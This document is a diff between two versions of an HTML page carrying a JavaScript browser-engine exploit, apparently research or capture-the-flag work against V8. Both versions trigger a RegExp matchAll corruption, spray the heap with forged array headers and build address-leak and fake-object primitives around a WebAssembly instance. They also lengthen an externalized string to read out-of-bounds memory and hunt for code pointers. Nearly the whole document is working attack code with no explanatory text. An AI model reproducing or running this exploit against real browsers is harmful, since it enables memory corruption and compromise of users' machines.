@@ -1,5 +1,4 @@
-<!doctype html>
-<html><head><meta charset="utf-8"><title>P48</title></head>
+<!doctype html><html><head><meta charset="utf-8"><title>P48</title></head>
 <body><pre id="out">Running...</pre>
 <script>
 "use strict";
@@ -12,8 +11,6 @@ function f2i(f){f64[0]=f;return u64[0];}
 function w2f(lo,hi){u32[0]=lo>>>0;u32[1]=hi>>>0;return f64[0];}
 function trash(n){for(let i=0;i<n;i++)new Array(0x400).fill(1.1);}
 const DMAP=0x1032a5d,EMPTY=0x7e5,MAXS=0x7fdffffe;
-const PINS=[0x1080011];
-const dblA=new Array(0x8000);for(let i=0;i<dblA.length;i++)dblA[i]=10.125+i*0.001;
 const marker={mmm:1};
 const marker2={zzz:2};
 const objB=new Array(0x8000);
@@ -21,179 +18,105 @@ for(var i=0;i<objB.length;i++)objB[i]=marker;
 const wasmI=new WebAssembly.Instance(new WebAssembly.Module(
   new Uint8Array([0,97,115,109,1,0,0,0,1,5,1,96,0,1,127,3,2,1,0,7,5,1,1,102,0,0,10,6,1,4,0,65,42,11])));
 objB[4]=wasmI;
-const victim=[1.22,1.33,1.44];
+// PRE-ALLOCATE ES before trigger — will be promoted to old space
+const dec=new TextDecoder("windows-1252");
+const eb=new Uint8Array(0x40);eb.fill(0x41);
+const es=dec.decode(eb);
 const re=/(?:)/;
 const fk={flags:"g",lastIndex:1073741823,constructor:{[Symbol.species]:function(){return re;}}};
 const c0=w2f(DMAP,EMPTY);
 const sk=[];
 log("UA: "+navigator.userAgent);
-// PRE-PROMOTE: force objB (and friends) to old gen so their FAs never move
+// PRE-PROMOTE all objects including ES
 trash(230);trash(230);
-// re-touch objB after promotion to ensure elements stay hot
-objB[4]=wasmI; objB[5]=marker;
+objB[4]=wasmI;objB[5]=marker; // re-touch
 RegExp.prototype[Symbol.matchAll].call(fk,"").next();
 log("TRIG: "+re.lastIndex);
 trash(230);trash(230);
-for(let r=0;r<3;r++){
-  const pin=PINS[r%2];
-  const c1=w2f(pin,MAXS);
-  for(let i=0;i<12;i++){
-    const a=new Array(i&1?0x3ffb:0x3fff).fill(c0);
-    for(let j=1;j<a.length;j+=2)a[j]=c1;
-    sk.push(a);
-  }
-}
+for(let r=0;r<3;r++){const c1=w2f(0x1080011,MAXS);for(let i=0;i<12;i++){const a=new Array(i&1?0x3ffb:0x3fff).fill(c0);for(let j=1;j<a.length;j+=2)a[j]=c1;sk.push(a);}}
 try{
 const m=re.lastIndex;
 log("T: "+typeof m+" A="+Array.isArray(m));
 if(Array.isArray(m)){
   log("L: "+m.length);
-  const d=[];
-  for(let k=0;k<8;k++){try{d.push(f2i(m[k]).toString(16));}catch(e){d.push("E");break;}}
-  log("H0: "+d.join(","));
-  // Also probe dblA: if m[k] were dblA, m[0] would have been 10.125 (it's not)
-  // Scan SAFE window m[0..0x7000] for marker pattern (lo==hi odd pairs)
-  // collect ALL marker candidates
+  // Scan for LIVE objB
   const cands=[];
-  for(let k=0x8000;k<0x70000;k++){
+  for(let k=0x8000;k<0x10010;k++){
     try{
       const v=f2i(m[k]);const lo=v&0xffffffffn,hi=v>>32n;
-      if(lo===hi&&(lo&1n)===1n&&lo>0x1000n&&lo<0x2000000n){
+      if(lo===hi&&(lo&1n)===1n&&lo>0x100000n){
         if(f2i(m[k+1])===v){
           const v3=f2i(m[k+2]);const w=v3&0xffffffffn;
-          if(w!==lo&&(w&1n)===1n&&w>0x1000n){cands.push(k);}
+          if(w!==lo&&(w&1n)===1n&&w>0x100n){cands.push(k);}
         }
       }
-    }catch(e){log("STOP:"+k.toString(16));break;}
+    }catch(e){break;}
     if(cands.length>=6)break;
   }
-  log("CANDS:"+cands.map(x=>x.toString(16)).join(","));
-  // live-test each candidate
-  const before=f2i(m[OB2(cands,0)]);
-  function OB2(arr,i){return arr[i]||0;}
-  let liveIdx=-1;
-  for(let ci=0;ci<cands.length;ci++){
-    const k=cands[ci];
-    const b4=f2i(m[k+2]);
+  let liveK=-1;
+  for(const k of cands){
+    const b=f2i(m[k+2]);
     objB[4]=marker2;
-    const a4=f2i(m[k+2]);
+    const a=f2i(m[k+2]);
     objB[4]=marker;
-    if(a4!==b4){liveIdx=ci;break;}
+    if(a!==b){liveK=k;break;}
   }
-  if(liveIdx<0){log("ALL_STALE");}
-  else{
-    const OB=cands[liveIdx];
-    log("LIVE@"+OB.toString(16));
-    // ADDROF
+  if(liveK>=0){
+    log("LIVE@"+liveK.toString(16));
     objB[4]=wasmI;
-    const wasmAddr=f2i(m[OB+2])&0xffffffffn;
+    const wasmAddr=f2i(m[liveK+2])&0xffffffffn;
     objB[4]=marker;
     log("WASM:"+wasmAddr.toString(16));
-    // FAKEOBJ roundtrip
-    objB[4]=wasmI;
-    const raw=f2i(m[OB+2]);
-    m[OB+2]=i2f(raw);
-    const fo=objB[4];
-    log("FO:"+(!!fo&&!!fo.exports&&fo.exports.f()===42));
+    // ES addrof
+    objB[4]=es;
+    const esAddr=f2i(m[liveK+2])&0xffffffffn;
     objB[4]=marker;
-    // ES + NATIVE GROOM (v8CTF technique: densify malloc heap with resource objects)
-    try{
-      const dec=new TextDecoder("windows-1252");
-      const holder=document.createElement("div");
-      const keep=[];
-      function externalize(size,byte){
-        const bytes=new Uint8Array(size);bytes.fill(byte);
-        const v=dec.decode(bytes);
-        holder.setAttribute("data-x"+keep.length,v);
-        keep.push(v);
-        return v;
+    log("ES:"+esAddr.toString(16));
+    // ES length corruption
+    const tq=(esAddr-1n)+8n;
+    const off=tq-0x1080018n;
+    log("OFF:"+off.toString(16));
+    if(off>0n&&off<0x1000000n){
+      const idx=Number(off>>3n);
+      if((off&7n)===0n){
+        const v=f2i(m[idx]);
+        m[idx]=i2f((v&0xffffffff00000000n)|0x01200000n);
+      }else{
+        const idx2=Number((off-4n)>>3n);
+        const a=f2i(m[idx2]);
+        m[idx2]=i2f((0x01200000n<<32n)|(a&0xffffffffn));
       }
-      // groom 3000 x 0x400 = ~4.8MB native resources with C++ vtables
-      for(let gi=0;gi<3000;gi++){externalize(0x400,0x42+(gi%24));}
-      // create 8 candidate ES strings, pick one ABOVE master base
-      const esCands=[];
-      for(let ei=0;ei<8;ei++){
-        const eb=new Uint8Array(0x40);eb.fill(0x41);
-        const s=dec.decode(eb);
-        objB[4]=s;
-        const a=f2i(m[OB+2])&0xffffffffn;
-        objB[4]=marker;
-        esCands.push([s,a]);
-      }
-      // one more groom batch AFTER es so resources follow it in memory
-      for(let gi=0;gi<300;gi++){externalize(0x400,0x61+(gi%24));}
-      let es=null,esAddr=0n;
-      for(const [s,a] of esCands){
-        if(a>0x1080019n&&a<0x10000000n){es=s;esAddr=a;break;}
-      }
-      if(!es){es=esCands[0][0];esAddr=esCands[0][1];}
-      log("ES:"+esAddr.toString(16)+" DIFF:"+(esAddr!==wasmAddr));
-      // direct master write to es length qword at obj+8
-      const tq=(esAddr-1n)+8n;
-      const off=tq-0x1080018n;
-      if(off>0n&&off<0x10000000n){
-        if((off&7n)===0n){
-          const idx=Number(off>>3n);
-          const v=f2i(m[idx]);
-          m[idx]=i2f((v&0xffffffff00000000n)|0x01200000n);
-        }else{
-          const idx=Number((off-4n)>>3n);
-          const a=f2i(m[idx]);
-          const b=f2i(m[idx+1]);
-          m[idx]=i2f((0x01200000n<<32n)|(a&0xffffffffn));
-          m[idx+1]=i2f(b);
+      log("NL:"+es.length.toString(16));
+      if(es.length>=0x100000){
+        // Scan for code pointers
+        const P=[];
+        for(let off2=0x10;off2<0x7F00;off2+=0x10){
+          try{
+            let qw=0n;
+            for(let b=0;b<8;b++)qw|=BigInt(es.charCodeAt(off2+b))<<BigInt(b*8);
+            const top=Number(qw>>56n);
+            if(top>=0x55&&top<=0x56){P.push(off2.toString(16)+":"+qw.toString(16));if(P.length>=4)break;}
+            if(top===0x7f){P.push(off2.toString(16)+":7f.."+((qw>>40n)&0xffffn).toString(16));if(P.length>=4)break;}
+          }catch(e){break;}
         }
-        log("NL:"+es.length.toString(16));
-        if(es.length===0x01200000){
-          // fine scan: collect qwords, find repeated values (vtable signature)
-          const counts=new Map();
-          let nz=0,ptrLike=0;
-          for(let off=0x400;off<0x100000;off+=8){
-            let q="";
-            for(let j2=0;j2<8;j2++){q+=es.charCodeAt(off+j2).toString(16).padStart(2,"0");}
-            if(q==="0000000000000000")continue;
-            nz++;
-            // pointer-like: top 4 hex digits non-zero AND not all-f (canonical userspace ptr)
-            const hi=q.slice(0,4);
-            if(hi!=="0000"&&hi!=="ffff"&&q.slice(12,16)!=="0000"===false){}
-            if(q.slice(0,4)!=="0000"&&q.slice(0,4)!=="ffff"&&q.slice(0,2)!=="00"){
-              ptrLike++;
-              counts.set(q,(counts.get(q)||0)+1);
-            }
+        if(P.length)log("CP:"+P.join(","));
+        else{
+          // Show non-zero data
+          const D=[];
+          for(let off2=0x40;off2<0x400;off2+=0x20){
+            try{
+              let qw=0n;
+              for(let b=0;b<8;b++)qw|=BigInt(es.charCodeAt(off2+b))<<BigInt(b*8);
+              if(qw!==0n){D.push(off2.toString(16)+":"+qw.toString(16).slice(-12));if(D.length>=6)break;}
+            }catch(e){}
           }
-          const top=[...counts.entries()].sort((a,b)=>b[1]-a[1]).slice(0,8);
-          log("NZ:"+nz+" PTR:"+ptrLike+" TOP:"+(top.length?top.map(e=>e[0]+"x"+e[1]).join(","):"none"));
-          // context dump around first occurrence of the TOP value and any 55/7f-suffixed pointer
-          const tv=top.length?top[0][0]:null;
-          let ctx1="",ctx2="";
-          for(let off=0x400;off<0x100000;off+=8){
-            let q="";
-            for(let j2=0;j2<8;j2++){q+=es.charCodeAt(off+j2).toString(16).padStart(2,"0");}
-            if(!ctx1&&tv&&q===tv){
-              for(let d=-4;d<=6;d++){
-                let w="";
-                for(let j2=0;j2<8;j2++){w+=es.charCodeAt(off+d*8+j2).toString(16).padStart(2,"0");}
-                ctx1+=(d>=0?"+":"")+d+":"+w+" ";
-              }
-            }
-            if(!ctx2&&(q.endsWith("5500")||q.endsWith("7f00"))){
-              for(let d=-2;d<=3;d++){
-                let w="";
-                for(let j2=0;j2<8;j2++){w+=es.charCodeAt(off+d*8+j2).toString(16).padStart(2,"0");}
-                ctx2+=(d>=0?"+":"")+d+":"+w+" ";
-              }
-            }
-            if(ctx1&&ctx2)break;
-          }
-          if(ctx1)log("CTX1:"+ctx1);
-          if(ctx2)log("CTX2:"+ctx2);
+          log("D:"+(D.length?D.join(","):"ZERO"));
         }
-      }else{log("OFF_BAD:"+off.toString(16));}
-    }catch(e){log("ESE:"+e.message);}
-  }
+      }
+    }else{log("OFF_BAD:"+off.toString(16));}
+  }else{log("STALE");}
   log("W: "+wasmI.exports.f());
-}else if(typeof m==="number"){log("N: "+f2i(m).toString(16));}
-else{log("OBJ:"+typeof m);}
+}else{log("NA");}
 }catch(e){log("E: "+e.message);}
 log("=== DONE ===");
 </script></body></html>
